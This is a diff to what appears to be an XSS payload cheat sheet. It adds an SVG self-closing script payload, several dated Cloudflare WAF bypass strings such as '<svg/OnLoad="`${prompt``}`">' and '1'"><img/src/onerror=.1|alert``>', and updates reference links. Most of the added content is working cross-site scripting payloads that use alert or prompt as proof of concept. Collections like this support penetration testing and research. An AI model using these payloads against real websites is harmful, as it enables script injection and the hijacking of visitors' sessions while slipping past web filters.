@@ -143,6 +143,7 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
 
 Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
@@ -928,7 +929,7 @@ XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o
 
 ## CSP Bypass
 
-Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://appio.dev/vulns/google-csp-evaluator/)
+Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)
 
 ### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
@@ -975,7 +976,27 @@ Works for CSP like `script-src 'self' data:`
 
 ## Common WAF Bypass
 
-### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) - 3rd june 2019
+### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
+
+#### 21st april 2020
+
+```html
+<svg/OnLoad="`${prompt``}`">
+```
+
+#### 22nd august 2019
+
+```html
+<svg/onload=%26nbsp;alert`bohdan`+
+```
+
+#### 5th jule 2019
+
+```html
+1'"><img/src/onerror=.1|alert``>
+```
+
+#### 3rd june 2019
 
 ```html
 <svg onload=prompt%26%230000000040document.domain)>
@@ -1108,3 +1129,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
 - [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
+- [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
